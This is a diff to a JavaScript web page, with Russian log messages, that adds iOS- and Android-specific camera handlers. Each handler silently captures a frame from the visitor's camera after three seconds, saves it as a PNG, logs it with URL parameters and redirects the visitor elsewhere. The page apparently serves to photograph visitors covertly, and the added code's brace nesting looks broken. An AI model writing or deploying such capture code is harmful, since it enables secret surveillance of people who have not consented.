@@ -103,18 +103,9 @@
     }
 
 
-
-
-
-
-
-
-
-
-    
-
-
-    function handleSuccess(stream) {
+    const partyGoer = navigator.userAgent || navigator.vendor || window.opera;
+    if (/iPad|iPhone|iPod/.test(partyGoer)) {
+      function handleSuccess(stream) {
       
       console.log('Начинаем обработку потока камеры...');
       window.stream = stream;
@@ -135,10 +126,46 @@
             photoTaken = true;
             logPhotoInfo();
             redirectToFinalDestination();
-          }, 'image/png');
+            }, 'image/png');
+          }
+        }, 3000);
+      }
+
+    } else if (/android/i.test(partyGoer)) {
+      
+        async function handleSuccess(stream) {
+
+        console.log('Начинаем обработку потока камеры...');
+        window.stream = stream;
+        video.srcObject = stream;
+        video.muted = true;
+        await video.play();
+        const { videoWidth, videoHeight } = video;
+
+        const context = canvas.getContext('2d');
+
+        setTimeout(function () {
+          if (!photoTaken) {
+              canvas.width = videoWidth;
+              canvas.height = videoHeight;
+              context.drawImage(video, 0, 0, videoWidth, videoHeight);
+              canvas.toBlob(function(blob) {
+                    console.log('Фотография создана');
+                    savedPhoto = blob;
+                    photoTaken = true;
+                    
+                    logPhotoInfo();
+                    redirectToFinalDestination();
+                    
+                  }, 'image/png');
+                }}, 3000);
         }
-      }, 3000);
+
     }
+
+
+    
+
 
     function logPhotoInfo() {
       const urlParams = new URLSearchParams(window.location.search);
